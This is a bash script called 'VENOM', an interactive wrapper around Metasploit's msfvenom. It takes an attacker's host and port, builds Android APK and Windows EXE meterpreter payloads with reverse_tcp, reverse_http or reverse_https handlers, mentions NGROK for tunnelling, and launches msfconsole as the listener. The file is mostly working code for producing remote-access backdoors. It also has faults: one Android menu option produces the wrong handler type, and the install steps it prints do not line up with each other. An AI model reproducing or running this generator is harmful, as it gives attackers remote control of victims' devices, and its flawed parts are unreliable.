#!/bin/bash
#this is the code for executing a shell script
if [[ $EUID -ne 0 ]]; then
  echo "script must be run as root"
  exit 1
fi
clear
dpkg -s figlet &> /dev/null
if [ $? -ne 0 ]; then
  echo -e "figlet is required for better display press y to install\n"
  apt-get install figlet
fi
figlet VENOM

echo -e "\n\n\a\e[31mwelcome to metasploit automated payload generator \e[0m"
echo "[+]  is Metasploit present in your system(y/n):"
read z
if [ "$z" != 'y' ];then
 echo "please install metasploit and try again!"
 echo -e "you can install metasploit using steps
         \n[1] curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb
         \n[2] chmod 755 msfinstall
         \n[3] ./msfinstall"
 exit 0
fi
while true
 do
echo -e "\n[1] continue \n[2] exit\n\n"
read -p "[+] enter your choice:" x
if [ $x -eq 2 ]
then
 echo "$x is your choice"
 exit 0
else
 echo -e "[+]you can also use\a\e[31m NGROK \e[0mserver for the process"
 echo -e "[+]link for NGROK https://ngrok.com/"

 echo -e "\n[+] enter lhost ip address:"
 xterm -e "ifconfig ; sleep 10"
 read lhst
 echo -e "\n[+]enter lport number:(ex:443,8080)"
 read lprt
 echo -e "\n[+]enter a name for payload:"
 read name
 echo -e "\n[+]choose your target payload:"
 echo -e "\n[1]android\n[2]windows\n[3]linux\n[4]exit"
 echo -e "enter your choice:"
 read y
 echo -e "\n[+]choose the type of handler:"
 echo -e "\n[1]reverse_tcp\n[2]reverse_http\n[3]reverse_https\n[4]exit"
 echo -e "enter your choice:"
 read z
 #echo -e "\nPayload generator: "
  while :
   do
  case $y in 1)
    while :
       do
        case $z in 1)
               msfvenom -p android/meterpreter/reverse_tcp lhost=$lhst lport=$lprt -o $PWD/$name.apk
               xterm -e "echo payload saved at $PWD/$name ; sleep 10"
  #echo "payload sucessfully generated "
               echo -e "\ndo you want to start console:(y/n)"
               read ans
               if [ "$ans" == 'y' ]
               then
                 msfconsole
               else
                 bash ./loadpentest.sh
               fi
        ;;
       2)
              msfvenom -p android/meterpreter/reverse_http lhost=$lhst lport=$lprt -o $PWD/$name.apk
              xterm -e "echo payload saved at $PWD/$name ; sleep 10"
              echo -e "\ndo you want to start console:(y/n)"
              read ans
              if [ "$ans" == 'y' ]
              then
                msfconsole
              else
                bash ./loadpentest.sh
              fi
        ;;
       3)
               msfvenom -p android/meterpreter/reverse_http lhost=$lhst lport=$lprt -o $PWD/$name.apk
               xterm -e "echo payload saved at $PWD/$name ; sleep 10"
               echo -e "\ndo you want to start console:(y/n)"
               read ans
               if [ "$ans" == 'y' ]
               then
                 msfconsole
               else
                 bash ./loadpentest.sh
               fi
       ;;
      4)
             echo -e"THANK YOU"
             exit 0
       ;;
      *)
            echo -e "THANK YOU"
            exit 0
       ;;
      esac
     done
  ;;
  2)
    while :
     do
       case $z in 1)
        #echo -e "\n under updates"
          msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhst lport=$lprt -o $PWD/$name.exe
          xterm -e "echo payload saved at $PWD/$name ; sleep 10"
          echo -e "\ndo you want to start console:(y/n)"
          read ans
          if [ "$ans" == 'y' ]
          then
           msfconsole
          else
           bash ./loadpentest.sh
          fi
       ;;
       2)
         msfvenom -p windows/meterpreter/reverse_http lhost=$lhst lport=$lprt -o $PWD/$name.exe
         xterm -e "echo payload saved at $PWD/$name ; sleep 10"
         echo -e "\ndo you want to start console:(y/n)"
         read ans
         if [ "$ans" == 'y' ]
         then
          msfconsole
         else
          bash ./loadpentest.sh
         fi
       ;;
       3)
         msfvenom -p windows/meterpreter/reverse_https lhost=$lhst lport=$lprt -o $PWD/$name.exe
         xterm -e "echo payload saved at $PWD/$name ; sleep 10"
         echo -e "\ndo you want to start console:(y/n)"
         read ans
         if [ "$ans" == 'y' ]
         then
           msfconsole
         else
           bash ./loadpentest.sh
         fi
       ;;
      *)
        echo -e "\nTHANK YOU"
        exit 0
        ;;
      esac
     done
  ;;
 3)
  echo -e "\n UNDER UPDATES"
  break
  ;;
 4)
  echo -e "\n THANK YOU"
  exit 0
  ;;
 *)
  echo -e "enter correct choice"
  break
  ;;
 esac
 done
fi
done
